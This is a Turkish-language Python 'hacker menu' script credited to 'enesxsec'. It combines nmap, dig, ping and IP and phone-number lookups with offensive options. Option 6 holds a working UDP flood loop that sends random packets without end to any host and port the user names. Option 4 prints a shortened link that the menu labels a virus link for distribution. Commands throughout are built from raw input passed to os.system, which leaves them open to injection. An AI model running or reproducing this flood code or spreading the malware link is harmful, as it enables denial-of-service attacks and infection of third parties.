import os
import time
import socket
import sys
import ipaddress
import requests
import platform
from colorama import Fore, Style
import scapy.all as scapy
import random
import phonenumbers
from phonenumbers import geocoder,carrier,timezone
import subprocess

os.system("pip3 install ipaddress")
os.system("pip3 install requests")
os.system("pip3 install colorama")
os.system("pip3 install scapy")
os.system("pip3 install phonenumbers")
os.system("apt install dnsutils")
os.system("apt install neofetch")
print(Fore.RED + "")

os.system("figlet isletim")
      


system_info = {}
system_info['İşletim Sistemi'] = platform.system()
system_info['Sürüm'] = platform.release()
system_info['Mimarisi'] = platform.machine()
for category, info in system_info.items():

    print(category)
    print('=' * 30)
    print(info)
    print() 
time.sleep(3) 

print(Style.RESET_ALL)
print(Fore.YELLOW +  """

      [ CODED BY ENESXSEC ]

        insta: enesxsec""")

print(Fore.GREEN + "")
def generate_random_banner():
    banners = [
        """
        ===================================
        ===============  ==================
        ===============  ==================
        ===============  ==============  ==
        ==   ===    ===  ===   ===  ==    =
        =  =  ==  =  ==  ==     =======  ==
        ==  ====  =  ==  ==  =  ==  ===  ==
        ===  ===    ===  ==  =  ==  ===  ==
        =  =  ==  =====  ==  =  ==  ===  ==
        ==   ===  =====  ===   ===  ===   =
        ===================================
        """,
        """
                 ___
                 `MM          68b
                  MM          Y89   /
  ____  __ ____   MM   _____  ___  /M
 6MMMMb\`M6MMMMb  MM  6MMMMMb `MM /MMMMM
MM'    ` MM'  `Mb MM 6M'   `Mb MM  MM
YM.      MM    MM MM MM     MM MM  MM
 YMMMMb  MM    MM MM MM     MM MM  MM
     `Mb MM    MM MM MM     MM MM  MM
L    ,MM MM.  ,M9 MM YM.   ,M9 MM  YM.  ,
MYMMMM9  MMYMMM9 _MM_ YMMMMM9 _MM_  YMMM9
         MM
         MM
        _MM_
        """,
        """
------------ -----------  ----           --------   --------  ------------
************ ************ ****          **********  ********  ************
----         ---      --- ----         ----    ----   ----    ------------
************ ************ ****         ***      ***   ****        ****
------------ -----------  ----         ---      ---   ----        ----
       ***** ****         ************ ****    ****   ****        ****
------------ ----         ------------  ----------  --------      ----
************ ****         ************   ********   ********      ****


        """,
        """

                   d8b           d8,
                   88P          `8P    d8P
                  d88               d888888P
 .d888b,?88,.d88b,888   d8888b   88b  ?88'
 ?8b,   `?88'  ?88?88  d8P' ?88  88P  88P
   `?8b   88b  d8P 88b 88b  d88 d88   88b
`?888P'   888888P'  88b`?8888P'd88'   `?8b
          88P'
         d88
         ?8P
        """,
        """

                     /$$           /$$   /$$
                    | $$          |__/  | $$
  /$$$$$$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$
 /$$_____/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/
|  $$$$$$ | $$  \ $$| $$| $$  \ $$| $$  | $$
 \____  $$| $$  | $$| $$| $$  | $$| $$  | $$ /$$
 /$$$$$$$/| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/
|_______/ | $$____/ |__/ \______/ |__/   \___/
          | $$
          | $$
          |__/

        """,
        """
@@@@@@   @@@@@@@   @@@        @@@@@@   @@@  @@@@@@@
@@@@@@@   @@@@@@@@  @@@       @@@@@@@@  @@@  @@@@@@@
!@@       @@!  @@@  @@!       @@!  @@@  @@!    @@!
!@!       !@!  @!@  !@!       !@!  @!@  !@!    !@!
!!@@!!    @!@@!@!   @!!       @!@  !@!  !!@    @!!
 !!@!!!   !!@!!!    !!!       !@!  !!!  !!!    !!!
     !:!  !!:       !!:       !!:  !!!  !!:    !!:
    !:!   :!:        :!:      :!:  !:!  :!:    :!:
:::: ::    ::        :: ::::  ::::: ::   ::     ::
:: : :     :        : :: : :   : :  :   :       :


        """,
        """

     _______..______    __        ______    __  .___________.
    /       ||   _  \  |  |      /  __  \  |  | |           |
   |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
    \   \    |   ___/  |  |     |  |  |  | |  |     |  |
.----)   |   |  |      |  `----.|  `--'  | |  |     |  |
|_______/    | _|      |_______| \______/  |__|     |__|

        """,
        """

  sSSs   .S_sSSs    S.        sSSs_sSSs     .S  sdSS_SSSSSSbs
 d%%SP  .SS~YS%%b   SS.      d%%SP~YS%%b   .SS  YSSS~S%SSSSSP
d%S'    S%S   `S%b  S%S     d%S'     `S%b  S%S       S%S
S%|     S%S    S%S  S%S     S%S       S%S  S%S       S%S
S&S     S%S    d*S  S&S     S&S       S&S  S&S       S&S
Y&Ss    S&S   .S*S  S&S     S&S       S&S  S&S       S&S
`S&&S   S&S_sdSSS   S&S     S&S       S&S  S&S       S&S
  `S*S  S&S~YSSY    S&S     S&S       S&S  S&S       S&S
   l*S  S*S         S*b     S*b       d*S  S*S       S*S
  .S*P  S*S         S*S.    S*S.     .S*S  S*S       S*S
sSS*S   S*S          SSSbs   SSSbs_sdSSS   S*S       S*S
YSS'    S*S           YSSP    YSSP~YSSY    S*S       S*S
        SP                                 SP        SP
        Y                                  Y         Y

        """,
        """
                     ##
                     ##               #
                     ##              ###     #
                     ##               #     ##
                     ##                     ##
   /###      /###    ##      /###   ###   ########
  / #### /  / ###  / ##     / ###  / ### ########
 ##  ###/  /   ###/  ##    /   ###/   ##    ##
####      ##    ##   ##   ##    ##    ##    ##
  ###     ##    ##   ##   ##    ##    ##    ##
    ###   ##    ##   ##   ##    ##    ##    ##
      ### ##    ##   ##   ##    ##    ##    ##
 /###  ## ##    ##   ##   ##    ##    ##    ##
/ #### /  #######    ### / ######     ### / ##
   ###/   ######      ##/   ####       ##/   ##
          ##
          ##
          ##
           ##
        """,
        """
_______  _______  ___      _______  ___   _______
|       ||       ||   |    |       ||   | |       |
|  _____||    _  ||   |    |   _   ||   | |_     _|
| |_____ |   |_| ||   |    |  | |  ||   |   |   |
|_____  ||    ___||   |___ |  |_|  ||   |   |   |
 _____| ||   |    |       ||       ||   |   |   |
|_______||___|    |_______||_______||___|   |___|

        """
]

    random_banner = random.choice(banners)
    print(random_banner)
generate_random_banner()
print(Style.RESET_ALL)

def yukleme_animasyonu():

    animasyon_karakterleri = ["|", "/", "-", "\\"]

    for i in range(10):

        animasyon = f"Yükleniyor... {animasyon_karakterleri[i % len(animasyon_karakterleri)]}"
        sys.stdout.write(animasyon)
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write("\b" * len(animasyon))
        sys.stdout.flush()

yukleme_animasyonu()
print("Tamamlandı!")

def get_local_ip():

    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()

        return local_ip

    except socket.error:

        return "IP adresi alınamadı."

ip_address = get_local_ip()

print("Yerel IP Adresiniz:", ip_address)
hostname = socket.gethostname()

print("Hostname:", hostname)
response = requests.get("http://ip-api.com/json")

data = response.json()
gateway = data["query"]

print("Ağ Geçidi:", gateway)
time.sleep(2)

print(Fore.RED + """--------------------------------------""")

print("> welcome to the menu")
time.sleep(1)
print(Fore.CYAN + """

[1] NMAP SCANNER
[2] NMAP VERSİYON BİLGİSİ
[3] NMAP PORT ÜZERİNDE BULUNAN İP GÖSTERGESİ
[4] E-VİRÜS
[5] SUBNET SCANNER
[6] DDOS SALDIRISI YAP
[7] TELEFON NUMARADAN BİLGİ AL +90
[8] DİG TARAMASI YAP
[9] PİNG TARA
[10] IP TARA
[11] ÇIKIŞ
""")

print(Style.RESET_ALL)

print(Fore.RED + "--------------------------------------")

islemno=input("İşlem numarası giriniz: ")

if islemno=="1":

        hedefip=input("hedef HOST giriniz : ")
        os.system("nmap -sT -v "+hedefip)

if islemno=="2":

        hedefip=input("hedef HOST giriniz : ")
        os.system("nmap -sV  "+hedefip)

if islemno=="3":
      
       hedefip=input("hedef HOST giriniz : ") 
       os.system("nmap -sn -n -v --open "+hedefip)

if islemno=="4":

        hedefip=input("VİRÜSLÜ LİNKİ ALMAK İÇİN ENTER BAS: ")
        time.sleep(2)

        print(Fore.YELLOW + "> https://tinyurl.com/uppdatesnew <")
print(Fore.CYAN + "")
if islemno=="5":

    os.system("figlet subnet")
    ip_adresi = input("IP adresini girin (örneğin, 192.168.0.0): ")

    prefix = int(input("Prefix uzunluğunu girin (örneğin, 24): "))
    network = ipaddress.ip_network(ip_adresi + '/' + str(prefix), strict=False)

    subnetler = list(network.subnets(new_prefix=prefix))
    print(f"\nAna ağ: {network.network_address}/{network.prefixlen}")

    print(f"Alt ağ sayısı: {len(subnetler)}\n")
    for subnet in subnetler:

        print(subnet)

if islemno == "6":

    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    print(Fore.CYAN + "")
    os.system("figlet DDOS")

    time.sleep(1)

    print(Fore.YELLOW + "------------------------------- ")
    ip = input("HEDEF HOST GİR : ")
    time.sleep(1)

    port = int(input("HEDEF PORT GİR : "))
    print("SALDIRI BAŞLATILIYOR...")
    print("HEDEF HOST", ip, "HEDEF PORT", port, "...")
    time.sleep(5)

    sent = 0

    while True:

        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1

        print("Sent %s packet to %s through port:%s" % (sent, ip, port))

        if port == 65535:
            port = 1

    input("çıkmak için enter tuşuna bas...")            
print(Fore.GREEN + "")

if islemno == "7":

    def phone_info():

        while True:

            os.system("figlet phone number")
            print("[1] Çıkış")
            print("[2] Telefon numarasından bilgi al")
            i = input("İşlem numarası giriniz: ")

            def operation():

                if i == "1":

                    exit()

                elif i == "2":

                    number = input("Telefon numarasını ülke kodu ile birlikte gir (+90) : ")
                    phone_number = phonenumbers.parse(number, None)
                    print("Ülke/Şehir-Country/City: ", geocoder.description_for_number(phone_number, "tr"))
                    print("Saat dilimi-Time zone: ", timezone.time_zones_for_number(phone_number))
                    print("Operatör-Operator: ", carrier.name_for_number(phone_number, "tr"))

                else:

                    print("Hatalı")

            operation()

    phone_info()  

if islemno == "8":

    hedefip = input("Hedef site gir: ")

    os.system("figlet dig scanner")

    os.system("dig " + hedefip)
    time.sleep(1)
    os.system("dig ANY  " + hedefip)
    time.sleep(1)
    os.system("dig TTL  " + hedefip)
    time.sleep(1)
    os.system("dig +answer -x  " + hedefip)
    time.sleep(1)
    os.system("dig +noall +answer  " + hedefip)
    time.sleep(1)
    os.system("dig +nssearch " + hedefip)
    time.sleep(1)
    os.system("dig -i  " + hedefip)
    time.sleep(1) 
    os.system("dig +trace  " + hedefip)
    time.sleep(1)
    os.system("dig +short  " + hedefip)
    time.sleep(1)
    os.system("dig SOA " +hedefip)
    time.sleep(1)
    print("İşlem tamamlandı.")

if islemno == "9":
    def ping(host):

        try:

            output = subprocess.check_output(['ping', '-c', '4', host])
            return output.decode('utf-8')

        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8')

    print(Fore.CYAN + "")
    hedefip = input("site gir: ")
    os.system("figlet ping scanner")

    ping_result = ping(hedefip)
    print(ping_result)


if islemno == "10":
    os.system("figlet ip")
    ip = input('site adı gir: ')

    a = f'http://ip-api.com/json/{ip}'

    a2 = requests.get(a)
    a3 = a2.json()
    status = a3["status"]
    cidade = a3["city"]
    q = a3["query"]
    país = a3["country"]
    cdp = a3["countryCode"]
    sestate = a3["region"]
    state = a3["regionName"]
    zip = a3["zip"]
    lat = a3["lat"]
    long = a3["lon"]
    timez = a3["timezone"]
    op = a3["isp"]
    org = a3["org"]
    As = a3["as"]

    print(f'ip = {q}')
    print(f'status = {status}')
    print(f'país  = {país}')
    print(f'sigla = {cdp}')
    print(f'estado = {state}-{sestate}')
    print(f'cidade = {cidade}')
    print(f'zip = {zip}')
    print(f'latitude = {lat}')
    print(f'longitude = {long}')
    print(f'continente/cidade = {timez}')
    print(f'isp = {op}')
    print(f'org = {org}')
    print(f'As = {As}')
      

islemno = "11"
if islemno == "11":
    sys.exit()
